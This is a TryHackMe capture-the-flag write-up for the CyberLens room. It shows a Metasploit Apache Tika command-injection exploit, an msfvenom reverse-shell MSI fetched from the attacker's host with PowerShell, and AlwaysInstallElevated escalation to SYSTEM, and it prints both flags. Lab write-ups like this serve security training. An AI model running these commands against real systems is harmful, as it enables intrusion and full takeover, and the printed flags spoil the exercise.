## CyberLens - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/cyberlensp6)

Challenge Description
Welcome to the clandestine world of CyberLens, where shadows dance amidst the digital domain and metadata reveals the secrets that lie concealed within every image. 
As you embark on this thrilling journey, prepare to unveil the hidden matrix of information that lurks beneath the surface, for here at CyberLens, we make metadata our playground.

In this labyrinthine realm of cyber security, we have mastered the arcane arts of digital forensics and image analysis. 
Armed with advanced techniques and cutting-edge tools, we delve into the very fabric of digital images, peeling back layers of information to expose the unseen stories they yearn to tell.

Picture yourself as a modern-day investigator, equipped not only with technical prowess but also with a keen eye for detail. 
Our team of elite experts will guide you through the intricate paths of image analysis, where file structures and data patterns provide valuable insights into the origins and nature of digital artifacts.

At CyberLens, we believe that every pixel holds a story, and it is our mission to decipher those stories and extract the truth. 
Join us on this exciting adventure as we navigate the digital landscape and uncover the hidden narratives that await us at every turn.

Can you exploit the CyberLens web server and discover the hidden flags? 

Things to Note
1. Be sure to add the IP to your /etc/hosts file: sudo echo 'MACHINE_IP cyberlens.thm' >> /etc/hosts

2. Make sure you wait 5 minutes before starting so the VM fully starts each service

**IP: cyberlens.thm**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Web, Windows <br>

**Tools Used**: Nmap, Gobuster, Metasploit<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting off with Nmap scan and Gobuster.

  ```
  $ nmap -sC -sV cyberlens.thm

  PORT     STATE SERVICE       VERSION
  80/tcp   open  http          Apache httpd 2.4.57 ((Win64))
  | http-methods: 
  |_  Potentially risky methods: TRACE
  |_http-server-header: Apache/2.4.57 (Win64)
  |_http-title: CyberLens: Unveiling the Hidden Matrix
  135/tcp  open  msrpc         Microsoft Windows RPC
  139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
  445/tcp  open  microsoft-ds?
  3389/tcp open  ms-wbt-server Microsoft Terminal Services
  |_ssl-date: 2025-06-08T19:04:27+00:00; 0s from scanner time.
  | rdp-ntlm-info: 
  |   Target_Name: CYBERLENS
  |   NetBIOS_Domain_Name: CYBERLENS
  |   NetBIOS_Computer_Name: CYBERLENS
  |   DNS_Domain_Name: CyberLens
  |   DNS_Computer_Name: CyberLens
  |   Product_Version: 10.0.17763
  |_  System_Time: 2025-06-08T19:04:19+00:00
  | ssl-cert: Subject: commonName=CyberLens
  | Not valid before: 2025-06-07T18:15:26
  |_Not valid after:  2025-12-07T18:15:26
  5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
  |_http-title: Not Found
  |_http-server-header: Microsoft-HTTPAPI/2.0
  Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
  
  Host script results:
  | smb2-time: 
  |   date: 2025-06-08T19:04:19
  |_  start_date: N/A
  | smb2-security-mode: 
  |   3:1:1: 
  |_    Message signing enabled but not required
  ```

  ```
  $ gobuster dir -u http://cyberlens.thm -w /usr/share/wordlists/dirb/common.txt

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.hta                 (Status: 403) [Size: 199]
  /.htaccess            (Status: 403) [Size: 199]
  /.htpasswd            (Status: 403) [Size: 199]
  /aux                  (Status: 403) [Size: 199]
  /cgi-bin/             (Status: 403) [Size: 199]
  /com2                 (Status: 403) [Size: 199]
  /com3                 (Status: 403) [Size: 199]
  /com1                 (Status: 403) [Size: 199]
  /con                  (Status: 403) [Size: 199]
  /css                  (Status: 301) [Size: 233] [--> http://cyberlens.thm/css/]
  /images               (Status: 301) [Size: 236] [--> http://cyberlens.thm/images/]
  /Images               (Status: 301) [Size: 236] [--> http://cyberlens.thm/Images/]
  /index.html           (Status: 200) [Size: 8780]
  /js                   (Status: 301) [Size: 232] [--> http://cyberlens.thm/js/]
  /lpt1                 (Status: 403) [Size: 199]
  /lpt2                 (Status: 403) [Size: 199]
  /nul                  (Status: 403) [Size: 199]
  /prn                  (Status: 403) [Size: 199]
  Progress: 4614 / 4615 (99.98%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- After digging through these assets I found this bad boi in `http://cyberlens.thm/js/image-extractor.js`:

  ```
  [SNIP!]
  fetch("http://localhost:61777/meta", {
        method: "PUT",
        body: fileData,
        headers: {
          "Accept": "application/json",
          "Content-Type": "application/octet-stream"
  [SNIP!]
  ```
  
- So I visited that port and found `Apache Tika 1.17 Server`.

  ```
  Welcome to the Apache Tika 1.17 Server

  For endpoints, please see https://wiki.apache.org/tika/TikaJAXRS and http://tika.apache.org/1.17/miredot/index.html
  
      PUT /detect/stream
      Class: org.apache.tika.server.resource.DetectorResource
      Method: detect
      Produces: text/plain
      GET /detectors
      Class: org.apache.tika.server.resource.TikaDetectors
      Method: getDectorsHTML
      Produces: text/html
      GET /detectors
      Class: org.apache.tika.server.resource.TikaDetectors
      Method: getDetectorsJSON
      Produces: application/json
      [SNIP!]
  ```

---

## ⚙️ Shell Access

- Then, I started searching for exploits.

  ```
  $ searchsploit Apache Tika
  ----------------------------------------------------------------------------------- ---------------------------------
   Exploit Title                                                                     |  Path
  ----------------------------------------------------------------------------------- ---------------------------------
  Apache Tika 1.15 - 1.17 - Header Command Injection (Metasploit)                    | windows/remote/47208.rb
  Apache Tika-server < 1.18 - Command Injection                                      | windows/remote/46540.py
  ----------------------------------------------------------------------------------- ---------------------------------
  Shellcodes: No Results
  ```
  
- Let's check the Metasploit one.

  ```
  msf6 > search apache tika

  Matching Modules
  ================
  
     #  Name                                          Disclosure Date  Rank       Check  Description
     -  ----                                          ---------------  ----       -----  -----------
     0  exploit/windows/http/apache_tika_jp2_jscript  2018-04-25       excellent  Yes    Apache Tika Header Command Injection
  
  
  Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/apache_tika_jp2_jscript
  
  msf6 > use 0
  [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
  msf6 exploit(windows/http/apache_tika_jp2_jscript) > show options
  ```
  
- Cool, fill up all the parameters and run it. I actually got a shell the second time I ran it, first one was a scam...

  ```
  msf6 exploit(windows/http/apache_tika_jp2_jscript) > set RHOSTS 10.10.149.152
  RHOSTS => 10.10.149.152
  msf6 exploit(windows/http/apache_tika_jp2_jscript) > set RPORT 61777
  RPORT => 61777
  msf6 exploit(windows/http/apache_tika_jp2_jscript) > set LHOST [YOUR-THM-IP]
  LHOST => [YOUR-THM-IP]
  msf6 exploit(windows/http/apache_tika_jp2_jscript) > run
  [*] Started reverse TCP handler on [YOUR-THM-IP]:4444 
  [*] Running automatic check ("set AutoCheck false" to disable)
  [+] The target is vulnerable.
  [*] Sending PUT request to 10.10.149.152:61777/meta
  [*] Command Stager progress -   8.10% done (7999/98798 bytes)
  [*] Sending PUT request to 10.10.149.152:61777/meta
  [*] Command Stager progress -  16.19% done (15998/98798 bytes)
  [*] Sending PUT request to 10.10.149.152:61777/meta
  [*] Command Stager progress -  24.29% done (23997/98798 bytes)
  [*] Sending PUT request to 10.10.149.152:61777/meta
  [*] Command Stager progress -  32.39% done (31996/98798 bytes)
  [*] Sending PUT request to 10.10.149.152:61777/meta
  [*] Command Stager progress -  40.48% done (39995/98798 bytes)
  [*] Sending PUT request to 10.10.149.152:61777/meta
  [*] Command Stager progress -  48.58% done (47994/98798 bytes)
  [*] Sending PUT request to 10.10.149.152:61777/meta
  [*] Command Stager progress -  56.67% done (55993/98798 bytes)
  [*] Sending PUT request to 10.10.149.152:61777/meta
  [*] Command Stager progress -  64.77% done (63992/98798 bytes)
  [*] Sending PUT request to 10.10.149.152:61777/meta
  [*] Command Stager progress -  72.87% done (71991/98798 bytes)
  [*] Sending PUT request to 10.10.149.152:61777/meta
  [*] Command Stager progress -  80.96% done (79990/98798 bytes)
  [*] Sending PUT request to 10.10.149.152:61777/meta
  [*] Command Stager progress -  89.06% done (87989/98798 bytes)
  [*] Sending PUT request to 10.10.149.152:61777/meta
  [*] Command Stager progress -  97.16% done (95988/98798 bytes)
  [*] Sending PUT request to 10.10.149.152:61777/meta
  [*] Command Stager progress - 100.00% done (98798/98798 bytes)
  [*] Sending stage (177734 bytes) to 10.10.149.152
  [*] Meterpreter session 1 opened ([YOUR-THM-IP]:4444 -> 10.10.149.152:49860) at 2025-06-08 19:43:28 +0100
  
  meterpreter > shell
  Process 1424 created.
  Channel 1 created.
  Microsoft Windows [Version 10.0.17763.1821]
  (c) 2018 Microsoft Corporation. All rights reserved.
  
  C:\Windows\system32>whoami
  whoami
  cyberlens\cyberlens
  ```

---

## 🧍 User Privilege Escalation

- Just read the first flag.

  ```
  C:\Users\CyberLens\Desktop>dir
  dir
   Volume in drive C has no label.
   Volume Serial Number is A8A4-C362
  
   Directory of C:\Users\CyberLens\Desktop
  
  06/06/2023  07:53 PM    <DIR>          .
  06/06/2023  07:53 PM    <DIR>          ..
  06/21/2016  03:36 PM               527 EC2 Feedback.website
  06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
  06/06/2023  07:54 PM                25 user.txt
                 3 File(s)          1,106 bytes
                 2 Dir(s)  14,941,790,208 bytes free
  
  C:\Users\CyberLens\Desktop>type user.txt
  type user.txt
  THM{T1k4-CV3-f0r-7h3-w1n}
  ```
  
- Moving to root now. Or should I say Administrator lol.

---

## 👑 Root Privilege Escalation

- After enumerating for a while I found a way to Administrator through `AlwaysInstallElevated`.

  ```
  C:\Users\CyberLens\Desktop>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  
  HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
      AlwaysInstallElevated    REG_DWORD    0x1
  
  
  C:\Users\CyberLens\Desktop>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  
  HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
      AlwaysInstallElevated    REG_DWORD    0x1
  ```
  
- Note that the both keys are set to 1 (0x1). You can find a full guide for this exploitation on TryHackMe's Windows PrivEsc and WindowsPrivEsc Arena rooms. They are both free!

- Now generate a reverse shell with msfvenom.

  ```
  $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[YOUR-THM-IP] LPORT=5555 -f msi -o reverse.msi
  [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
  [-] No arch selected, selecting arch: x64 from the payload
  No encoder specified, outputting raw payload
  Payload size: 460 bytes
  Final size of msi file: 159744 bytes
  Saved as: reverse.msi
  ```
  
- Now start a Python server and download the reverse shell to target machine.

  ```
  C:\Users\CyberLens\Desktop>powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://[YOUR-THM-IP]:80/reverse.msi','C:\Users\CyberLens\Desktop\reverse.msi')"
  powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://[YOUR-THM-IP]:80/reverse.msi','C:\Users\CyberLens\Desktop\reverse.msi')"
  
  C:\Users\CyberLens\Desktop>dir
  dir
   Volume in drive C has no label.
   Volume Serial Number is A8A4-C362
  
   Directory of C:\Users\CyberLens\Desktop
  
  06/08/2025  06:54 PM    <DIR>          .
  06/08/2025  06:54 PM    <DIR>          ..
  06/21/2016  03:36 PM               527 EC2 Feedback.website
  06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
  06/08/2025  06:54 PM           159,744 reverse.msi
  06/06/2023  07:54 PM                25 user.txt
                 4 File(s)        160,850 bytes
                 2 Dir(s)  14,940,573,696 bytes free

  $ python3 -m http.server 80                                                                                
  Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
  10.10.149.152 - - [08/Jun/2025 19:54:42] "GET /reverse.msi HTTP/1.1" 200 -
  ```

- At last, start a listener and run the shell.

  ```
  C:\Users\CyberLens\Desktop>msiexec /quiet /qn /i C:\Users\CyberLens\Desktop\reverse.msi
  msiexec /quiet /qn /i C:\Users\CyberLens\Desktop\reverse.msi

  $ nc -lvnp 5555
  listening on [any] 5555 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.149.152] 49948
  Microsoft Windows [Version 10.0.17763.1821]
  (c) 2018 Microsoft Corporation. All rights reserved.
  
  C:\Windows\system32>whoami
  whoami
  nt authority\system
  ```

- Read the admin flag, bye!

---

## 🏁 Flags

- **User Flag**: `THM{T1k4-CV3-f0r-7h3-w1n}`
- **Root Flag**: `THM{3lev@t3D-4-pr1v35c!}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Nothing much, Metasploit did everything lol.`

- What did I learn?
  `Got some Windows practice.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
